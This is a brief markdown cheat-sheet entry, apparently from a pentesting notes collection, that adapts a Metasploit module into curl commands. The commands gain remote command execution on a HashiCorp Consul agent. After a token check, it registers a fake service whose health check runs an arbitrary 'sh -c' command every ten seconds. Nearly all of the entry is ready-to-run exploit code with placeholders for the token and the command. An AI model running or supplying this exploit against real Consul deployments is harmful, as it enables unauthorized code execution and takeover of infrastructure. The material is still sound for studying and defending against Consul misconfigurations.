#  Hashicorp Consul - Remote Command Execution via Services API


From [metasploit](https://github.com/rapid7/metasploit-framework/blob/8368accd5592392a6d8449490f222f4b269e3a3c/modules/exploits/multi/misc/consul_service_exec.rb) but using curl.

```bash
export CONSUL_TOKEN="CONSUL TOKEN HERE"

# check
curl http://127.0.0.1:8500/v1/agent/self -H "X-Consul-Token: $CONSUL_TOKEN"

export CMD="cmd here"

# exploit
curl http://127.0.0.1:8500/v1/agent/service/register \
  -H "X-Consul-Token: $CONSUL_TOKEN" \
  -H "Content-Type: application/json" \
  -X "PUT" \
  -d '{"ID":"12345","Name":"12345","Address":"127.0.0.1","Port":80,"check":{"Args":["sh","-c","$CMD"],"interval":"10s","Timeout":"86400s"}}'
```
